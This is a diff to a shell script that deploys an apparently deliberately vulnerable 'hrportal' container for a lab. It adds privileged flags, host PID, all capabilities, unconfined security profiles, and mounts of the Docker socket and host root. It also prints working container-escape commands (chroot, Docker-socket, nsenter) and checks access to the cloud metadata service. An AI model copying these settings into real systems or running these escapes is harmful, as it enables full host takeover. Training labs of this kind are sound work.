@@ -26,8 +26,8 @@ echo "[*] Stopping existing container..."
 docker stop hrportal 2>/dev/null || true
 docker rm hrportal 2>/dev/null || true
 
-# Run container with metadata access enabled
-echo "[*] Starting vulnerable container..."
+# Run container with metadata access enabled AND container escape vulnerabilities
+echo "[*] Starting vulnerable container with escape vectors..."
 docker run -d \
   --name hrportal \
   -p 80:8080 \
@@ -38,6 +38,13 @@ docker run -d \
   -e PORT="8080" \
   -e VITE_BASE_URL="http://localhost" \
   --privileged \
+  --pid=host \
+  --cap-add=ALL \
+  --security-opt apparmor:unconfined \
+  --security-opt seccomp:unconfined \
+  -v /var/run/docker.sock:/var/run/docker.sock \
+  -v /:/host \
+  -v /proc:/hostproc:ro \
   $IMAGE
 
 echo ""
@@ -56,4 +63,34 @@ echo ""
 
 # Quick test to verify metadata access
 echo "[*] Quick metadata access test..."
-docker exec hrportal sh -c 'curl -s --connect-timeout 2 http://169.254.169.254/ >/dev/null 2>&1 && echo "[+] Metadata service is accessible from container!" || echo "[-] Metadata service is NOT accessible"' 
+docker exec hrportal sh -c 'curl -s --connect-timeout 2 http://169.254.169.254/ >/dev/null 2>&1 && echo "[+] Metadata service is accessible from container!" || echo "[-] Metadata service is NOT accessible"'
+
+echo ""
+echo "==== Container Escape Vulnerability Test ===="
+echo "[*] Checking container escape vectors..."
+echo ""
+
+# Check privileged mode
+docker exec hrportal sh -c 'grep CapEff /proc/self/status | grep -q "ffffffff" && echo "[+] Container is running in PRIVILEGED mode - escape possible!" || echo "[-] Container is NOT privileged"'
+
+# Check Docker socket
+docker exec hrportal sh -c '[ -S /var/run/docker.sock ] && echo "[+] Docker socket is mounted - escape possible via Docker!" || echo "[-] Docker socket not found"'
+
+# Check host filesystem
+docker exec hrportal sh -c '[ -d /host ] && echo "[+] Host filesystem is mounted at /host - direct escape possible!" || echo "[-] Host filesystem not mounted"'
+
+# Check PID namespace
+docker exec hrportal sh -c 'ps aux | grep -q systemd && echo "[+] Host PID namespace accessible - process escape possible!" || echo "[-] Isolated PID namespace"'
+
+echo ""
+echo "==== Container Escape Commands ===="
+echo "Try these commands inside the container:"
+echo ""
+echo "1. Direct host access:"
+echo "   docker exec -it hrportal sh -c 'chroot /host /bin/bash'"
+echo ""
+echo "2. Docker socket escape:"
+echo "   docker exec -it hrportal sh -c 'docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh'"
+echo ""
+echo "3. Process namespace escape:"
+echo "   docker exec -it hrportal sh -c 'nsenter -t 1 -m -u -i -n -p bash'" 
